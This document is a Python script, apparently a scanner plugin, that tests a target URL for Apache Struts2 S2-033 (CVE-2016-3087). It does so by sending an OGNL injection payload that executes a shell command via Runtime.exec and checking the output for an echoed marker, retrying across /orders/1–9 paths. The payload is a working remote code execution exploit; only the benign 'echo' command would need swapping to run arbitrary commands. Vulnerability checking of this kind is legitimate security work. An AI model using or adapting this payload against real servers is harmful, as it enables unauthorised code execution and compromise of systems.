import requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = 'Apache Struts2 S2-033 远程代码执行漏洞 (CVE-2016-3087)'


def run(url):
    headers = {
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    try:
        payload = '''%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=echo Tre0a498347a5a75a7ue'''
        response = requests.get(url+payload, headers=headers, timeout=15, verify=False)
        if 'Tre0a498347a5a75a7ue' in response.text and 'echo' not in response.text:
            return ['True',name,url]
        else:
            host = urlparse(url)
            url = f"{host.scheme}://{host.netloc}"
            try:
                for number in range(1,10):
                    vulurl = url + f'/orders/{number}/'
                    payload = '''%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=echo Tre0a498347a5a75a7ue'''
                    response = requests.get(vulurl+payload, headers=headers, timeout=15, verify=False)
                    if 'Tre0a498347a5a75a7ue' in response.text and 'echo' not in response.text:
                        return ['True',name,vulurl]
                    elif number == 9:
                        return ['False',name]
            except Exception as e:
                return ['False',name]
    except Exception as e:
        return ['False',name]

if __name__ == '__main__':
    url = 'http://192.168.123.46:8080/'
    print(run(url))